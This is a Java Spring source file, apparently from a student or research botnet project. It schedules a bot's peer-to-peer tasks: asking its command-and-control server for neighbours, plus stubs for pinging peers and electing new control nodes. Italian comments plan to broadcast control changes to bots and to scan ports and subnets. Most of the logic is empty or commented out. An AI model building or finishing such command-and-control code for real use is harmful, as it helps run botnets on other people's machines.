package cs.sii.schedule.net;

import java.text.SimpleDateFormat;
import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import cs.sii.bot.action.Behavior;
import cs.sii.config.onLoad.Config;
import cs.sii.control.command.Commando;
import cs.sii.service.connection.NetworkService;

@Component
public class ScheduledTasksNet {

	private static final Logger log = LoggerFactory.getLogger(ScheduledTasksNet.class);

	private static final SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
	@Autowired
	private Commando cmm;
	@Autowired
	private NetworkService nServ;
	@Autowired
	private Config configEngine;
	@Autowired
	private Behavior botB;
	
	
////TODO da fare un pò di cose vedi sotto
//	@Scheduled(fixedRate = 3600000)
//	public void computeNet() {
//		if (configEngine.isCommandandconquerStatus())
////			nServ.setConstructList(botServ.findAll());
//			cmm.updateNetworkP2P();
//
//	}
//	
	
	public void getNeighbours() {
		if (!configEngine.isCommandandconquerStatus())
//			nServ.setConstructList(botServ.findAll());
			botB.getRequest().askNeighbours(nServ.getCommandConquerIps().getList().get(0).getValue1().toString(), nServ.getMyIp().toString(), nServ.getIdHash());

	}
	
	
	@Scheduled(fixedRate = 3600000)
	public void pingCeC() {
		if (configEngine.isCommandandconquerStatus()){
			//pinga listacec se sono piu di uno per mantere minimo
		}
	}
	
	
	@Scheduled(fixedRate = 3600000)
	public void electionDay() {
		if (configEngine.isCommandandconquerStatus()){
			//prendi lista bot
			//vedi chi è elegibile
			//elegilo passa i dati
			// passa il potere
		}
	}
	
	@Scheduled(fixedRate = 5000)
	public void pingVicinato() {

		// TODO PIng

		// pinga il vicinato

		// per ogni vicino

		// prova K volte di fare ping
		// se falliscie K volte Kill

		// manda lista killed a CeC
		log.info("The time is now {}", dateFormat.format(new Date()));
	}

	// se sei il cec ricalcola il grafo sulla base del vecchio con Updatenetwork
	// ogni tot tempo e se la lista dei nodi è cambiata
	// poi spamma la list anuova

	// eleggere nuovo gruppo di cec e spammare ai bot il nuovo gruppo da cui
	// eseguire chiamate

	// Scan porte e sottorete + invio report?= sarebbe sgravo se fatto


}
